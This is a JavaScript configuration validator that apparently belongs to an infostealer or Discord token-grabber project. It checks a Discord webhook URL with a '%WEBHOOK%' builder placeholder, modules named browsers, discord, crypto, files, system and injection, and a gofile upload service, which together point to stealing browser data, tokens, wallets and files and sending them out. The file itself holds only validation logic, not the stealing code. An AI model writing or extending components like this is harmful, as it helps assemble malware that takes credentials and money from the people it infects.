/**
 * Configuration Validator Utility
 * Provides comprehensive validation for application configuration
 */

const { logger } = require('./logger');
const { ConfigError } = require('./errors');
const { DEFAULTS, ERROR_CODES } = require('./constants');

class ConfigValidator {
    /**
     * Validate complete configuration object
     * @param {Object} config - Configuration object to validate
     * @returns {Object} Validation result with errors and warnings
     */
    static validate(config) {
        const result = {
            valid: true,
            errors: [],
            warnings: []
        };

        try {
            // Validate required fields
            this.validateRequired(config, result);
            
            // Validate webhook configuration
            this.validateWebhook(config, result);
            
            // Validate module configuration
            this.validateModules(config, result);
            
            // Validate paths
            this.validatePaths(config, result);
            
            // Validate upload settings
            this.validateUpload(config, result);

            result.valid = result.errors.length === 0;
            
            if (!result.valid) {
                logger.error('Configuration validation failed', {
                    errors: result.errors,
                    warnings: result.warnings
                });
            } else if (result.warnings.length > 0) {
                logger.warn('Configuration validation passed with warnings', {
                    warnings: result.warnings
                });
            } else {
                logger.debug('Configuration validation passed');
            }

        } catch (error) {
            result.valid = false;
            result.errors.push(`Validation failed: ${error.message}`);
        }

        return result;
    }

    /**
     * Validate required configuration fields
     * @param {Object} config - Configuration object
     * @param {Object} result - Validation result object
     */
    static validateRequired(config, result) {
        const required = {
            'app.name': 'Application name',
            'app.version': 'Application version',
            'webhook.url': 'Webhook URL',
            'paths.temp': 'Temporary path'
        };

        for (const [path, description] of Object.entries(required)) {
            const value = this.getConfigValue(config, path);
            if (!value || value === '') {
                result.errors.push(`Missing required field: ${description} (${path})`);
            }
        }
    }

    /**
     * Validate webhook configuration
     * @param {Object} config - Configuration object
     * @param {Object} result - Validation result object
     */
    static validateWebhook(config, result) {
        const webhookUrl = this.getConfigValue(config, 'webhook.url');
        const timeout = this.getConfigValue(config, 'webhook.timeout');

        if (webhookUrl) {
            if (webhookUrl === '%WEBHOOK%') {
                result.warnings.push('Webhook URL contains placeholder value');
            } else if (!this.isValidUrl(webhookUrl)) {
                result.errors.push('Invalid webhook URL format');
            } else if (!webhookUrl.includes('discord.com')) {
                result.warnings.push('Webhook URL does not appear to be a Discord webhook');
            }
        }

        if (timeout && (timeout < 1000 || timeout > 60000)) {
            result.warnings.push('Webhook timeout should be between 1-60 seconds');
        }
    }

    /**
     * Validate module configuration
     * @param {Object} config - Configuration object
     * @param {Object} result - Validation result object
     */
    static validateModules(config, result) {
        const modules = this.getConfigValue(config, 'modules.enabled');
        
        if (!modules || typeof modules !== 'object') {
            result.errors.push('Modules configuration must be an object');
            return;
        }

        const validModules = ['browsers', 'discord', 'crypto', 'files', 'system', 'injection'];
        const enabledModules = Object.keys(modules).filter(key => modules[key] === true);

        if (enabledModules.length === 0) {
            result.warnings.push('No modules are enabled');
        }

        for (const module of Object.keys(modules)) {
            if (!validModules.includes(module)) {
                result.warnings.push(`Unknown module: ${module}`);
            }
        }
    }

    /**
     * Validate paths configuration
     * @param {Object} config - Configuration object
     * @param {Object} result - Validation result object
     */
    static validatePaths(config, result) {
        const paths = this.getConfigValue(config, 'paths');
        
        if (!paths || typeof paths !== 'object') {
            result.errors.push('Paths configuration must be an object');
            return;
        }

        const requiredPaths = ['temp', 'output'];
        for (const pathName of requiredPaths) {
            const pathValue = paths[pathName];
            if (!pathValue || typeof pathValue !== 'string') {
                result.errors.push(`Invalid path configuration: ${pathName}`);
            }
        }
    }

    /**
     * Validate upload settings
     * @param {Object} config - Configuration object
     * @param {Object} result - Validation result object
     */
    static validateUpload(config, result) {
        const upload = this.getConfigValue(config, 'upload');
        
        if (upload) {
            const maxSize = upload.maxSize;
            if (maxSize && (maxSize < 1024 || maxSize > 100 * 1024 * 1024)) {
                result.warnings.push('Upload max size should be between 1KB and 100MB');
            }

            const service = upload.service;
            const validServices = ['gofile'];
            if (service && !validServices.includes(service)) {
                result.warnings.push(`Unknown upload service: ${service}`);
            }
        }
    }

    /**
     * Get configuration value by dot notation path
     * @param {Object} config - Configuration object
     * @param {string} path - Dot notation path
     * @returns {*} Configuration value
     */
    static getConfigValue(config, path) {
        const keys = path.split('.');
        let value = config;
        
        for (const key of keys) {
            if (value && typeof value === 'object' && key in value) {
                value = value[key];
            } else {
                return undefined;
            }
        }
        
        return value;
    }

    /**
     * Validate URL format
     * @param {string} url - URL to validate
     * @returns {boolean} True if valid URL
     */
    static isValidUrl(url) {
        try {
            new URL(url);
            return true;
        } catch {
            return false;
        }
    }

    /**
     * Create configuration error with details
     * @param {string} message - Error message
     * @param {Object} details - Error details
     * @returns {ConfigError} Configuration error
     */
    static createError(message, details = {}) {
        const error = new ConfigError(message, ERROR_CODES.CONFIG_INVALID);
        error.details = details;
        return error;
    }
}

module.exports = {
    ConfigValidator
};